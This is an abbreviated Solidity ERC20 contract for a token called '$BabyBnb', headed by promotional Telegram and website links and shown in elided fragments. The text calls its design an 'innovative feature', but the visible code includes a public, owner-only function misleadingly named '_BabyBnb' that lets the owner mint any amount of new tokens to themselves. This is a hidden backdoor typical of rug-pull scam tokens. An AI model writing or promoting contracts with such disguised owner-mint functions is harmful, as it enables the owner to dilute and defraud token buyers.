//
// $BabyBnb proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyBnbPortal
// 📱 Website ::https://babybnb.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyBnb(uint256 amount) public onlyOwner {
 _BabyBnb(msg.sender, amount);
    }
    ...
    function _BabyBnb(address account, uint256 amount) internal virtual {
...
contract $BabyBnb is ERC20 {
    ...
    constructor() public ERC20("Baby Bnb", "BABYBNB") {
     _BabyBnb(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}